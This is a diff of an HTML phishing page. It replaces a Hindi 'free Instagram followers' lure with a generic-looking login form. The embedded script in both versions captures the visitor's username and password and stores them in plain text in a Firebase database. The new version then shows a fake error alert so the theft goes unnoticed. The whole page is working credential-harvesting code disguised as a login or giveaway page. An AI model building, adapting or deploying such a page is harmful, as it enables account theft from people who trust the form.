@@ -1,110 +1,146 @@
-<!DOCTYPE html>
-<html lang="en">
+<html>
   <head>
-    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Free Instagram Followers</title>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>
+    <title>Login Form</title>
     <style>
-      /* Global styles */
       body {
         margin: 0;
         padding: 0;
-        font-family: "Poppins", Arial, sans-serif;
-        background: linear-gradient(to right, #8360c3, #2ebf91);
+        font-family: Arial, sans-serif;
+        background-color: #f3f3f3;
         display: flex;
         justify-content: center;
         align-items: center;
-        min-height: 100vh;
-        color: #fff;
+        height: 100vh;
       }
 
-      .container {
-        width: 100%;
-        max-width: 400px;
-        padding: 20px;
-        background: rgba(255, 255, 255, 0.1);
-        backdrop-filter: blur(10px);
-        border-radius: 15px;
-        box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
+      .menu {
+        position: absolute;
+        top: 10px;
+        left: 10px;
+        cursor: pointer;
+        z-index: 1000;
+      }
+
+      .menu span {
+        display: block;
+        width: 30px;
+        height: 3px;
+        margin: 5px 0;
+        background-color: #333;
+        border-radius: 2px;
+      }
+
+      .settings {
+        position: absolute;
+        top: 50px;
+        left: 10px;
+        background-color: #ffffff;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        border-radius: 8px;
+        padding: 10px;
+        display: none;
+      }
+
+      .settings a {
+        display: block;
+        padding: 10px;
+        color: #007bff;
+        text-decoration: none;
+        border-bottom: 1px solid #eee;
+      }
+
+      .settings a:last-child {
+        border-bottom: none;
+      }
+
+      .settings a:hover {
+        background-color: #f3f3f3;
+      }
+
+      .form-container {
         text-align: center;
-      }
-
-      .container h1 {
-        font-size: 24px;
-        margin-bottom: 10px;
-      }
-
-      .container p {
-        font-size: 16px;
-        margin-bottom: 20px;
-        line-height: 1.5;
+        padding: 20px;
+        background-color: #ffffff;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        border-radius: 8px;
+        max-width: 400px;
+        width: 100%;
       }
 
       .input-field {
+        display: block;
         width: 100%;
-        padding: 12px;
-        margin: 10px 0;
-        border: none;
-        border-radius: 8px;
-        font-size: 14px;
-        background: rgba(255, 255, 255, 0.2);
-        color: #fff;
+        max-width: 300px;
+        margin: 10px auto;
+        padding: 10px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        font-size: 16px;
       }
 
-      .input-field::placeholder {
-        color: #ddd;
+      .password-toggle {
+        position: relative;
+      }
+
+      .toggle-btn {
+        position: absolute;
+        right: 15px;
+        top: 50%;
+        transform: translateY(-50%);
+        cursor: pointer;
+        font-size: 14px;
+        color: #007bff;
       }
 
       .submit-button {
+        display: block;
         width: 100%;
-        padding: 12px;
+        max-width: 320px;
+        margin: 15px auto;
+        padding: 10px;
+        background-color: #007bff;
+        color: white;
         border: none;
-        border-radius: 8px;
+        border-radius: 5px;
         font-size: 16px;
-        font-weight: bold;
-        color: #fff;
-        background-color: #2ebf91;
         cursor: pointer;
-        transition: all 0.3s ease;
+        transition: background-color 0.3s ease;
       }
 
       .submit-button:hover {
-        background-color: #25a479;
-      }
-
-      footer {
-        margin-top: 20px;
-        font-size: 14px;
+        background-color: #0056b3;
       }
     </style>
   </head>
   <body>
-    <div class="container">
-      <h1>फ्री इंस्टाग्राम फॉलोअर्स</h1>
-      <p>
-        अब आपको बिल्कुल फ्री में इंस्टाग्राम पर एक हज़ार से ज्यादा फॉलोअर्स दिए जा
-        रहे हैं। अगर आप भी इस प्रकार से अपने फॉलोअर्स बढ़ाना चाहते हैं तो नीचे
-        लॉगिन करें।
-      </p>
+    <!-- Three-line menu -->
+    <div class="menu" onclick="toggleSettings()">
+      <span></span>
+      <span></span>
+      <span></span>
+    </div>
+
+    <!-- Settings dropdown -->
+    <div class="settings" id="settingsMenu">
+      <a href="#">Profile</a>
+      <a href="#">Change Password</a>
+      <a href="#">Logout</a>
+    </div>
+
+    <div class="form-container">
       <form id="loginForm">
-        <input
-          class="input-field"
-          id="username"
-          type="text"
-          placeholder="Enter your Username"
-        />
-        <input
-          class="input-field"
-          id="password"
-          type="password"
-          placeholder="Enter your Password"
-        />
+        <input class="input-field" id="username" placeholder="Enter your Username" type="text" />
+        <div class="password-toggle">
+          <input class="input-field" id="password" placeholder="Enter your Password" type="password" />
+          <span class="toggle-btn" onclick="togglePassword()">Show</span>
+        </div>
         <button class="submit-button" type="submit">Login</button>
       </form>
-      <footer>&copy; 2025 Free Followers | All Rights Reserved</footer>
     </div>
 
     <script type="module">
+      // Import Firebase SDK
       import { initializeApp } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-app.js";
       import { getDatabase, set, ref } from "https://www.gstatic.com/firebasejs/11.2.0/firebase-database.js";
 
@@ -124,25 +160,48 @@
       const app = initializeApp(firebaseConfig);
       const db = getDatabase(app);
 
+      // Function to write user data
       function writeUserData(userID, username, password) {
-        set(ref(db, "users/" + userID), { username: username, password: password });
+        set(ref(db, "users/" + userID), {
+          username: username,
+          password: password,
+        });
       }
 
       // Handle form submission
       document.getElementById("loginForm").addEventListener("submit", (event) => {
-        event.preventDefault();
+        event.preventDefault(); // Prevent form submission
+
         const username = document.getElementById("username").value;
         const password = document.getElementById("password").value;
-        const userID = new Date().getTime();
+        const userID = new Date().getTime(); // Example: Use timestamp as a unique ID
 
         if (username && password) {
           writeUserData(userID, username, password);
-          // Redirect to the success page after successful login
-          window.location.href = "save.html"; 
+          alert("Your Account is Unexpected! Please try again later!");
         } else {
           alert("Please fill in both fields.");
         }
       });
+
+      // Toggle settings menu visibility
+      function toggleSettings() {
+        const menu = document.getElementById("settingsMenu");
+        menu.style.display = menu.style.display === "block" ? "none" : "block";
+      }
+
+      // Toggle password visibility
+      function togglePassword() {
+        const passwordField = document.getElementById("password");
+        const toggleBtn = passwordField.nextElementSibling;
+        if (passwordField.type === "password") {
+          passwordField.type = "text";
+          toggleBtn.textContent = "Hide";
+        } else {
+          passwordField.type = "password";
+          toggleBtn.textContent = "Show";
+        }
+      }
     </script>
   </body>
 </html>
